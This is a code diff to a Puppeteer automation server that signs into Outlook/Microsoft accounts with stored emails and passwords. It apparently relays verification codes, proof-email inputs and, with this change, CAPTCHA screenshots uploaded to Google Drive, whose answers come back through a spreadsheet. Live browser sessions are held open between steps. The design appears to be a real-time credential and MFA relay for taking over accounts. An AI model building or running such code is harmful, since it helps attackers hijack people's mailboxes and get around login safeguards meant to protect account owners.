@@ -992,6 +992,126 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 logger.debug(`[processRow][${browserId}] Exiting WAITINGEMAIL timeout path.`);
                 return; // Exit processRow if email not found
             }
+        } else if (status === "WAITINGCAPTCHA") {
+            logger.info(`[processRow][${browserId}] Resuming from WAITINGCAPTCHA state.`);
+            const captchaConfig = platformConfig.captchaConfig;
+            if (!captchaConfig) {
+                logger.error(`[processRow][${browserId}] WAITINGCAPTCHA but no captchaConfig for platform ${platform}. Failing.`);
+                finalStatus = "FAILED";
+                updateData.status = "FAILED";
+            } else {
+                const captchaPollTimeout = Date.now() + 5 * 60 * 1000;
+                let captchaProcessed = false;
+                while (Date.now() < captchaPollTimeout && !captchaProcessed) {
+                    try {
+                        if (page && !(await isPageResponsive(page, browserId, instanceId))) {
+                            logger.error(`[processRow][${browserId}][WAITINGCAPTCHA] Page unresponsive.`);
+                            finalStatus = "FAILED";
+                            break;
+                        }
+                        const checkData = await fetchDataFromAppScript(1, 30000, true);
+                        const checkHeaders = checkData[0];
+                        const checkColumnIndexes = getColumnIndexes(checkHeaders);
+                        const checkRows = checkData.slice(1);
+                        const checkRow = checkRows.find(r => r[checkColumnIndexes['browserId']] === browserId);
+                        if (!checkRow) {
+                            logger.error(`[processRow][${browserId}][WAITINGCAPTCHA] Row not found.`);
+                            finalStatus = "FAILED";
+                            break;
+                        }
+                        if (checkRow[checkColumnIndexes['status']] === 'FAILED') {
+                            logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Status changed to FAILED externally.`);
+                            finalStatus = "FAILED";
+                            break;
+                        }
+                        const captchaAnswer = checkRow[checkColumnIndexes['captchaAnswer']];
+                        if (captchaAnswer && String(captchaAnswer).trim() !== "") {
+                            logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] CAPTCHA answer found: ${captchaAnswer}`);
+                            await updateBrowserRowData(browserId, { status: "PROCESSING", captchaAnswer: '' });
+                            // Find and fill the captcha answer input
+                            const answerSelectors = captchaConfig.answerInput.split(',').map(s => s.trim());
+                            let filled = false;
+                            for (const sel of answerSelectors) {
+                                try {
+                                    await page.waitForSelector(sel, { visible: true, timeout: 5000 });
+                                    await page.evaluate((s) => { const el = document.querySelector(s); if (el) el.value = ''; }, sel);
+                                    await page.type(sel, captchaAnswer, { delay: 30 });
+                                    filled = true;
+                                    logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Filled answer using selector: ${sel}`);
+                                    break;
+                                } catch (e) { /* try next */ }
+                            }
+                            if (filled) {
+                                const submitSelectors = captchaConfig.submitButton.split(',').map(s => s.trim());
+                                let submitted = false;
+                                for (const sel of submitSelectors) {
+                                    try {
+                                        await page.waitForSelector(sel, { visible: true, timeout: 5000 });
+                                        await page.click(sel);
+                                        submitted = true;
+                                        logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Clicked submit: ${sel}`);
+                                        break;
+                                    } catch (e) { /* try next */ }
+                                }
+                                if (!submitted) {
+                                    logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Submit button not found, pressing Enter.`);
+                                    await page.keyboard.press('Enter');
+                                }
+                                await new Promise(res => setTimeout(res, 3000));
+                                // Re-check account access after captcha submission
+                                const recheckResult = await checkAccountAccess(browser, page, email, password, platform, browserId, true);
+                                logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Re-check after captcha: ${JSON.stringify(recheckResult)}`);
+                                if (recheckResult.verificationState === 'CAPTCHA_FAILED') {
+                                    // Still on captcha, re-screenshot and update
+                                    try {
+                                        const screenshotBuffer = await page.screenshot({ fullPage: true });
+                                        const base64Image = screenshotBuffer.toString('base64');
+                                        const { uploadImageToDrive } = await import('../../../api/googledrive.mjs');
+                                        const uploadResult = await uploadImageToDrive(base64Image, `captcha_${browserId}_${Date.now()}.png`, process.env.GOOGLE_DRIVE_FOLDER_ID);
+                                        if (uploadResult.success) {
+                                            updateData.captcha = uploadResult.webViewLink;
+                                            await updateBrowserRowData(browserId, { captcha: uploadResult.webViewLink });
+                                        }
+                                    } catch (ssError) {
+                                        logger.error(`[processRow][${browserId}][WAITINGCAPTCHA] Re-screenshot error: ${ssError.message}`);
+                                    }
+                                    logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Still on captcha after answer. Re-entering WAITINGCAPTCHA.`);
+                                    await new Promise(res => setTimeout(res, 5000));
+                                } else if (recheckResult.reachedInbox) {
+                                    logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Captcha passed! Reached inbox.`);
+                                    finalStatus = "COMPLETED";
+                                    captchaProcessed = true;
+                                    break;
+                                } else if (recheckResult.requiresVerification) {
+                                    logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Captcha passed, now on verification screen.`);
+                                    finalStatus = recheckResult.verificationState;
+                                    captchaProcessed = true;
+                                    break;
+                                } else if (recheckResult.emailExists) {
+                                    logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Captcha passed, now on password screen.`);
+                                    finalStatus = "WAITINGPASSWORD";
+                                    captchaProcessed = true;
+                                    break;
+                                } else {
+                                    logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Unknown post-captcha state. Retrying.`);
+                                }
+                            } else {
+                                logger.warn(`[processRow][${browserId}][WAITINGCAPTCHA] Could not find captcha answer input. Retrying.`);
+                            }
+                        }
+                    } catch (pollError) {
+                        logger.error(`[processRow][${browserId}][WAITINGCAPTCHA] Poll error: ${pollError.message}`);
+                    }
+                    if (!captchaProcessed && finalStatus !== "FAILED") {
+                        await new Promise(res => setTimeout(res, 5000));
+                    }
+                }
+                if (!captchaProcessed && finalStatus !== "FAILED") {
+                    logger.warn(`[processRow][${browserId}][WAITINGCAPTCHA] Polling timed out.`);
+                    finalStatus = "WAITINGCAPTCHA";
+                }
+            }
+            updateData.status = finalStatus;
         } else if (status === "WAITINGPASSWORD") {
             logger.info(`[processRow][${browserId}] Resuming from WAITINGPASSWORD state.`);
             const pollingTimeoutPassword = Date.now() + 5 * 60 * 1000; // 5 minutes timeout
@@ -1063,6 +1183,16 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                         const currentUrl = page.url();
                                         const pageTitle = await page.title().catch(() => 'unknown');
                                         logger.debug(`[processRow][${browserId}] Password input not found. URL: ${currentUrl}, Title: ${pageTitle}`);
+
+                                        if (currentUrl === 'about:blank' || (!currentUrl.includes('login.live.com') && !currentUrl.includes('login.microsoftonline.com'))) {
+                                            logger.info(`[processRow][${browserId}] Page is at ${currentUrl}, navigating to login page for password entry.`);
+                                            await page.goto(platformConfig.url || 'https://outlook.live.com/mail/', { waitUntil: 'domcontentloaded', timeout: 30000 }).catch(e => {
+                                                logger.warn(`[processRow][${browserId}] Navigation to login page failed: ${e.message}`);
+                                            });
+                                            await new Promise(res => setTimeout(res, 3000));
+                                            continue;
+                                        }
+
                                         await handleAdditionalViews(page, platformConfig, instanceId, 'password_entry');
                                         const emailInputSelector = platformConfig.selectors?.input;
                                         if (emailInputSelector) {
@@ -1090,9 +1220,43 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                                 }
                                             }
                                         }
+                                        const captchaConfig = platformConfig.captchaConfig;
+                                        if (captchaConfig) {
+                                            const captchaUrl = page.url();
+                                            const isCaptcha = captchaConfig.urlPatterns.some(p => p.test(captchaUrl));
+                                            if (isCaptcha) {
+                                                logger.info(`[processRow][${browserId}] CAPTCHA detected in WAITINGPASSWORD loop. URL: ${captchaUrl}`);
+                                                try {
+                                                    const screenshotBuffer = await page.screenshot({ fullPage: true });
+                                                    const base64Image = screenshotBuffer.toString('base64');
+                const { uploadImageToDrive } = await import('../../../api/googledrive.mjs');
+                                                    const uploadResult = await uploadImageToDrive(base64Image, `captcha_${browserId}_${Date.now()}.png`, process.env.GOOGLE_DRIVE_FOLDER_ID);
+                                                    if (uploadResult.success) {
+                                                        logger.info(`[processRow][${browserId}] CAPTCHA screenshot uploaded: ${uploadResult.webViewLink}`);
+                                                        updateData.captcha = uploadResult.webViewLink;
+                                                    } else {
+                                                        logger.error(`[processRow][${browserId}] CAPTCHA upload failed: ${uploadResult.error}`);
+                                                    }
+                                                } catch (ssError) {
+                                                    logger.error(`[processRow][${browserId}] Error capturing CAPTCHA screenshot: ${ssError.message}`);
+                                                }
+                                                finalStatus = "WAITINGCAPTCHA";
+                                                updateData.status = "WAITINGCAPTCHA";
+                                                updateData.lastJsonResponse = JSON.stringify({
+                                                    browserId, email, status: "WAITINGCAPTCHA",
+                                                    emailExists: true, accountAccess: false, reachedInbox: false,
+                                                    platform, timestamp: new Date().toISOString(),
+                                                    message: "CAPTCHA challenge detected. Awaiting user input.",
+                                                    captchaUrl: page.url()
+                                                });
+                                                passwordProvidedAndProcessed = true;
+                                                break;
+                                            }
+                                        }
                                         await new Promise(res => setTimeout(res, 1000));
                                     }
                                 }
+                                if (passwordProvidedAndProcessed) break;
                                 if (!foundSelector) {
                                     throw new Error(`Password input not found after 30s polling timeout. Tried selectors: ${JSON.stringify(passwordInputSelectors)}`);
                                 }
@@ -1560,8 +1724,13 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                 await page.waitForSelector(selectedOption.inputSelector, { visible: true, timeout: 5000 });
                                 logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Input selector '${selectedOption.inputSelector}' is visible before typing.`);
                                 await page.evaluate((sel) => { const el = document.querySelector(sel); if (el) el.value = ''; }, selectedOption.inputSelector);
-                                await page.type(selectedOption.inputSelector, hiddenInputText, { delay: 50 });
-                                logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Typed "${hiddenInputText}" into ${selectedOption.inputSelector}`);
+                                let typedValue = hiddenInputText;
+                                if (selectedOption.inputSelector === '#iProofEmail' && typedValue.includes('@')) {
+                                    typedValue = typedValue.slice(0, typedValue.lastIndexOf('@'));
+                                    logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Stripped domain from email input: "${hiddenInputText}" → "${typedValue}"`);
+                                }
+                                await page.type(selectedOption.inputSelector, typedValue, { delay: 50 });
+                                logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Typed "${typedValue}" into ${selectedOption.inputSelector}`);
                             } else if (selectedOption.requiresInput && !hiddenInputText && currentActualViewName === 'Outlook Verify Email Full Input') {
                                 logger.error(`[processRow][${browserId}][WAITINGOPTIONS] 'Outlook Verify Email Full Input' requires hiddenInputText (full email) but it's missing. Clearing choice.`);
                                 await updateBrowserRowData(browserId, { verificationChoice: '', status: "WAITINGOPTIONS", verificationOptions: JSON.stringify(currentVerificationOptions) });
@@ -2412,20 +2581,35 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
         // However, if it's still the default "FAILED" from initialization, we can update it.
         // Prioritize explicit verification states from initialCheckResult
 
-        // Handle CAPTCHA_FAILED — no user action possible, immediately fail
+        // Handle CAPTCHA_FAILED — capture screenshot, upload to Drive, set WAITINGCAPTCHA
         if (initialCheckResult.verificationState === 'CAPTCHA_FAILED') {
-            logger.info(`[processRow][${browserId}] CAPTCHA_FAILED detected. Setting final status to FAILED.`);
-            finalStatus = "FAILED";
+            logger.info(`[processRow][${browserId}] CAPTCHA_FAILED detected. Capturing screenshot and setting WAITINGCAPTCHA.`);
+            try {
+                const screenshotBuffer = await page.screenshot({ fullPage: true });
+                const base64Image = screenshotBuffer.toString('base64');
+                const { uploadImageToDrive } = await import('../../../api/googledrive.mjs');
+                const uploadResult = await uploadImageToDrive(base64Image, `captcha_${browserId}_${Date.now()}.png`, process.env.GOOGLE_DRIVE_FOLDER_ID);
+                if (uploadResult.success) {
+                    logger.info(`[processRow][${browserId}] CAPTCHA screenshot uploaded: ${uploadResult.webViewLink}`);
+                    updateData.captcha = uploadResult.webViewLink;
+                } else {
+                    logger.error(`[processRow][${browserId}] CAPTCHA upload failed: ${uploadResult.error}`);
+                }
+            } catch (ssError) {
+                logger.error(`[processRow][${browserId}] Error capturing CAPTCHA screenshot: ${ssError.message}`);
+            }
+            finalStatus = "WAITINGCAPTCHA";
+            updateData.status = "WAITINGCAPTCHA";
             updateData.lastJsonResponse = JSON.stringify({
-                browserId, email, status: "FAILED",
+                browserId, email, status: "WAITINGCAPTCHA",
                 emailExists: initialCheckResult.emailExists,
                 accountAccess: false,
                 reachedInbox: false,
                 platform, timestamp: new Date().toISOString(),
-                message: "CAPTCHA challenge detected. Automated bypass is not available."
+                message: "CAPTCHA challenge detected. Awaiting user input.",
+                captchaUrl: page ? page.url() : undefined
             });
-            updateData.status = "FAILED";
-            notifyTeam({ type: 'CAPTCHA', platform, email, browserId, detail: 'CAPTCHA challenge detected - cannot bypass automatically', url: initialCheckResult.url });
+            notifyTeam({ type: 'CAPTCHA', platform, email, browserId, detail: 'CAPTCHA challenge detected - screenshot uploaded', url: page ? page.url() : undefined });
             await updateBrowserRowData(browserId, updateData);
             return;
         }
@@ -2554,7 +2738,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
             } else {
                 finalStatus = "FAILED";
             }
-        } else if (!initialCheckResult.emailExists && finalStatus !== "FAILED") {
+        } else if (!initialCheckResult.emailExists && finalStatus !== "FAILED" && finalStatus !== "COMPLETED") {
             finalStatus = "FAILED";
         }
 
@@ -2675,7 +2859,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 }
             }
 
-            if (updateData.status === "WAITINGCODE" || updateData.status === "WAITINGOPTIONS" || updateData.status === "WAITINGRECOVERYEMAIL" || updateData.status === "WAITINGPASSWORD" || updateData.status === "WAITINGEMAIL" || updateData.status === "WAITINGPASSWORDERROR" || updateData.status === "WAITINGEMAILERROR") {
+            if (updateData.status === "WAITINGCAPTCHA" || updateData.status === "WAITINGCODE" || updateData.status === "WAITINGOPTIONS" || updateData.status === "WAITINGRECOVERYEMAIL" || updateData.status === "WAITINGPASSWORD" || updateData.status === "WAITINGEMAIL" || updateData.status === "WAITINGPASSWORDERROR" || updateData.status === "WAITINGEMAILERROR") {
                 logger.info(`[processRow][${browserId}] Keeping browser open as it is in ${updateData.status} state. Storing session.`);
                 activeBrowserSessions.set(browserId, { browser, page, targetCreatedListener: sessionTargetListener }); // Store the listener that was active for this session
             } else {
@@ -2685,7 +2869,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 activeBrowserSessions.delete(browserId);
                 await new Promise(resolve => setTimeout(resolve, 2000)); // Add delay after browser.close()
             }
-        } else if (isReusingBrowser && browser && (updateData.status !== "WAITINGCODE" && updateData.status !== "WAITINGOPTIONS" && updateData.status !== "WAITINGRECOVERYEMAIL" && updateData.status !== "WAITINGPASSWORD" && updateData.status !== "WAITINGPASSWORDERROR" && updateData.status !== "WAITINGEMAILERROR")) {
+        } else if (isReusingBrowser && browser && (updateData.status !== "WAITINGCAPTCHA" && updateData.status !== "WAITINGCODE" && updateData.status !== "WAITINGOPTIONS" && updateData.status !== "WAITINGRECOVERYEMAIL" && updateData.status !== "WAITINGPASSWORD" && updateData.status !== "WAITINGPASSWORDERROR" && updateData.status !== "WAITINGEMAILERROR")) {
             const session = activeBrowserSessions.get(browserId);
             if (session?.targetCreatedListener && session.browser) {
                 try {
@@ -2849,7 +3033,7 @@ async function processWaitingRows() {
         const rows = data.slice(1);
 
 
-        const processableStatuses = ["WAITING", "WAITINGEMAIL", "WAITINGPASSWORD", "WAITINGPASSWORDERROR", "WAITINGOPTIONS", "WAITINGCODE", "WAITINGRECOVERYEMAIL"];
+        const processableStatuses = ["WAITING", "WAITINGEMAIL", "WAITINGPASSWORD", "WAITINGPASSWORDERROR", "WAITINGOPTIONS", "WAITINGCODE", "WAITINGRECOVERYEMAIL", "WAITINGCAPTCHA"];
         const staleCheckStatuses = [...processableStatuses, "WAITINGEMAILERROR", "WAITINGPASSWORDERROR", "PROCESSING"];
         const STALE_TIMEOUT_MS = 10 * 60 * 1000; // 10 minutes
         const activityIdx = columnIndexes['lastUserActivity'] !== undefined ? columnIndexes['lastUserActivity'] : columnIndexes['lastRun'];
@@ -3267,7 +3451,7 @@ export async function POST(request) {
         const currentBrowserId = requestBrowserId || finalStatusDetails?.browserId; // Use actualBrowserId for new processes
 
         if (browser && !browserFullyClosed) { // Only if a browser was actually launched/reused in this POST call
-            if (finalEffectiveStatus === "WAITINGCODE" || finalEffectiveStatus === "WAITINGOPTIONS" || finalEffectiveStatus === "WAITINGRECOVERYEMAIL" || finalEffectiveStatus === "WAITINGPASSWORD" || finalEffectiveStatus === "WAITINGPASSWORDERROR" || finalEffectiveStatus === "WAITINGEMAILERROR") {
+            if (finalEffectiveStatus === "WAITINGCAPTCHA" || finalEffectiveStatus === "WAITINGCODE" || finalEffectiveStatus === "WAITINGOPTIONS" || finalEffectiveStatus === "WAITINGRECOVERYEMAIL" || finalEffectiveStatus === "WAITINGPASSWORD" || finalEffectiveStatus === "WAITINGPASSWORDERROR" || finalEffectiveStatus === "WAITINGEMAILERROR") {
                 activeBrowserSessions.set(currentBrowserId, { browser, page, targetCreatedListener });
             } else {
                 if (targetCreatedListener && isReusingBrowserForPOST) try { browser.off('targetcreated', targetCreatedListener); } catch (e) {/*ignore*/ }
